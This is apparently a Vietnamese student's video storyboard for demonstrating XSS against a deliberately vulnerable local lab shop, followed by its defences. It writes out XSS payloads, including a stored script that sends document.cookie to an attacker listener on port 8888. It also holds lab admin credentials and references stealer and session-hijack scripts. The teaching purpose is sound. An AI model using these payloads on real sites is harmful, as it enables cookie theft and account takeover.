# KỊCH BẢN QUAY VIDEO DEMO LỖ HỔNG CROSS-SITE SCRIPTING (XSS) & GIẢI PHÁP PHÒNG VỆ
**Thời lượng video:** 2 đến 3 phút (Chuẩn yêu cầu BTL)  
**Tập tin bàn giao:** `THESIS/video/xss_demo.mp4`  
**Người thực hiện & Thuyết minh:** Thành viên 2 (Frontend & XSS Security Specialist)  
**Độ phân giải khuyến nghị:** 1080p (1920x1080), 30 hoặc 60 FPS, âm thanh rõ ràng không tạp âm.  
**Môi trường hệ thống:** Node.js Express (Port 3000) & MySQL 8.0 (Container DB) của TV1.  
**Công cụ hỗ trợ quay màn hình:** OBS Studio hoặc Windows Game Bar (`Win + G`).

---

## BẢNG PHÂN CẢNH CHI TIẾT THEO TỪNG GIÂY (STORYBOARD TIMELINE)

| Thời gian (Timeline) | Phân cảnh & Thao tác Màn hình (Screen Action) | Lời Thoại Thuyết Minh (Voiceover Script) | Trọng tâm Kỹ thuật (Focus) |
| :---: | :--- | :--- | :--- |
| **00:00 - 00:25**<br>*(25 giây)* | **Mở đầu & Giới thiệu giao diện VulnShop:**<br>- Mở trình duyệt tại `http://localhost:3000`.<br>- Chỉ rõ thanh banner màu đỏ **"⚠️ VULNERABLE MODE (Port 3000)"**.<br>- Lướt qua trang chủ, danh sách sản phẩm lấy từ MySQL và các điểm nhập liệu. | *"Xin chào thầy và các bạn! Em là Thành viên 2, phụ trách phân hệ Giao diện và Lỗ hổng Cross-Site Scripting (XSS). Hệ thống chạy trên nền Node.js Express và MySQL do Thành viên 1 thiết lập. Hôm nay em sẽ demo toàn bộ chuỗi: Dựng bề mặt tấn công -> Khai thác cướp Cookie -> Giả mạo phiên quản trị -> và Phòng thủ bằng Context-aware Encoding, DOMPurify cùng cờ HttpOnly."* | Giới thiệu môi trường Lab, trạng thái Vulnerable. |
| **00:25 - 00:55**<br>*(30 giây)* | **Khai thác Reflected XSS & DOM-based XSS:**<br>1. Vào ô tìm kiếm, nhập: `<script>alert('Reflected_XSS')</script>`. Nhấn Enter -> Trang `/search?q=...` phản xạ nguyên văn, popup alert bật lên ngay.<br>2. Mở tab `/order_track.html`, nối vào URL hash: `#<img src=x onerror=alert('DOM_XSS')>`. Nhấn Enter -> Popup DOM XSS kích hoạt qua innerHTML. | *"Đầu tiên là Reflected XSS tại thanh tìm kiếm. Khi nhập thẻ script, máy chủ Express ở chế độ Vulnerable phản xạ trực tiếp dữ liệu ra HTML khiến trình duyệt thực thi popup ngay lập tức. Tiếp theo là DOM-based XSS tại trang tra cứu vận đơn: dữ liệu từ location.hash được gán thẳng vào thuộc tính innerHTML mà không hề gửi lên máy chủ, gây ra lỗ hổng phía Client."* | Demo thành công 2 dạng XSS đầu tiên (Reflected & DOM). |
| **00:55 - 01:40**<br>*(45 giây)* | **Khai thác Stored XSS & Cướp Cookie Admin:**<br>1. Vào chi tiết sản phẩm 1 (`/product_detail.html?id=1`).<br>2. Tại form bình luận, gửi payload cướp cookie:<br>`Sản phẩm đẹp! <script>new Image().src="http://localhost:8888/log?cookie="+encodeURIComponent(document.cookie);</script>`.<br>3. Mở cửa sổ ẩn danh, đăng nhập tài khoản Quản trị `admin` / `Admin@123` và mở `/admin`.<br>4. Mở tab `http://localhost:8888/` (hoặc kiểm tra `stolen_cookies.txt`): Xuất hiện Session ID của Admin vừa bị đánh cắp ngầm.<br>5. Chạy lệnh: `python SOURCE/exploits/cookie_stealer/hijack_session.py` -> Đột nhập thành công vào Admin Dashboard không cần mật khẩu! | *"Bây giờ là kịch bản nguy hiểm nhất: Stored XSS và Session Hijacking. Em đóng vai kẻ tấn công, gửi một bình luận kèm mã JavaScript âm thầm đọc document.cookie và gửi về máy chủ Attacker cổng 8888. Bình luận này được lưu vĩnh viễn vào bảng reviews trong MySQL. Khi Quản trị viên đăng nhập và truy cập trang Admin, mã độc lập tức kích hoạt trong phiên của Admin. Tại máy chủ Attacker cổng 8888, ta thấy Session ID của Quản trị viên đã bị rò rỉ. Kẻ tấn công chạy hijack_session.py để chiếm toàn quyền kiểm soát hệ thống mà không cần biết mật khẩu!"* | Kịch bản cướp cookie, container listener cổng 8888, Session Hijacking thực tế. |
| **01:40 - 02:00**<br>*(20 giây)* | **Demo Thay đổi Giao diện (DOM Defacement):**<br>- Gửi payload thay đổi giao diện từ file `dom_defacement.js`.<br>- Trang sản phẩm lập tức hiện banner đỏ "HỆ THỐNG ĐÃ BỊ TẤN CÔNG" và đơn giá các thiết bị bị sửa thành "1.000 đ". | *"Không dừng lại ở việc đánh cắp dữ liệu, XSS còn cho phép thao túng Document Object Model để làm biến dạng giao diện (DOM Defacement). Ở đây kẻ tấn công đã chèn biểu ngữ đe dọa và can thiệp sửa giá niêm yết của các sản phẩm về 1.000 VNĐ, gây thiệt hại nghiêm trọng đến uy tín sàn TMĐT."* | Minh họa nguy cơ DOM Defacement theo đúng yêu cầu đề bài. |
| **02:00 - 02:45**<br>*(45 giây)* | **Kích hoạt Phòng thủ & Kiểm thử lại (Re-test):**<br>1. Chuyển môi trường sang `MODE=secure` (khởi động lại server hoặc container ở mode secure).<br>2. Chạy lại tìm kiếm: Thẻ `<script>` hiển thị dạng chữ thô được mã hóa an toàn, không có popup.<br>3. Mở lại trang sản phẩm và trang `/admin`: Bình luận hiển thị an toàn bằng `textContent` và `DOMPurify.sanitize()`.<br>4. Mở Inspect Element F12 -> Application -> Cookies: Chỉ ra Cookie `session_id` có cờ **HttpOnly** tích xanh.<br>5. Kiểm tra log cổng 8888: Khi cố tình đọc `document.cookie`, giá trị trả về là rỗng. | *"Để khắc phục triệt để, hệ thống được cấu hình sang Chế độ An toàn (Secure Mode). Ứng dụng áp dụng giải pháp phòng vệ đa lớp: Thứ nhất, mã hóa đầu ra và dùng textContent / DOMPurify thay thế toàn bộ innerHTML, biến mọi script thành văn bản thô an toàn. Thứ hai, bật cờ HttpOnly cho Session Cookie trong Express. Như thầy thấy trên DevTools, JavaScript hoàn toàn bị tước quyền đọc document.cookie, vô hiệu hóa 100% cuộc tấn công đánh cắp phiên. Cuối cùng, chính sách CSP tiếp tục ngăn chặn script độc hại từ bên ngoài."* | Chứng minh tính hiệu quả của giải pháp vá lỗi, DevTools inspect cờ HttpOnly. |
| **02:45 - 03:00**<br>*(15 giây)* | **Tổng kết & Chuyển giao phần tiếp theo:**<br>- Mở slide tổng kết kết quả của TV2.<br>- Cảm ơn người xem. | *"Như vậy, phân hệ XSS đã được chứng minh trọn vẹn từ khai thác cả 3 dạng đến phòng thủ nhiều lớp thành công trên nền tảng Express và MySQL đồng nhất với Thành viên 1. Em xin cảm ơn thầy và các bạn đã theo dõi!"* | Kết thúc chuyên nghiệp, khớp thời lượng 3 phút. |

---

## HƯỚNG DẪN KHỞI CHẠY ĐỂ QUAY VIDEO CHO THÀNH VIÊN 2
1. Khởi động hệ thống VulnShop (Node.js Express + MySQL) bằng Docker:
   ```bash
   docker compose up -d
   ```
   *(Hoặc chạy trực tiếp trên máy chủ thử nghiệm nếu đã cấu hình MySQL: `node SOURCE/web-app/backend/server.js`)*.
2. Khởi động Attacker Cookie Stealer Listener (Cổng 8888):
   ```bash
   python SOURCE/exploits/cookie_stealer/stealer.py
   ```
3. Mở OBS Studio, chọn quay cửa sổ trình duyệt Chrome tại `http://localhost:3000` ở độ phân giải Full HD 1080p.
4. Đọc thuyết minh khớp với thao tác màn hình theo bảng kịch bản ở trên.
5. Lưu file video vào đường dẫn: `THESIS/video/xss_demo.mp4`.
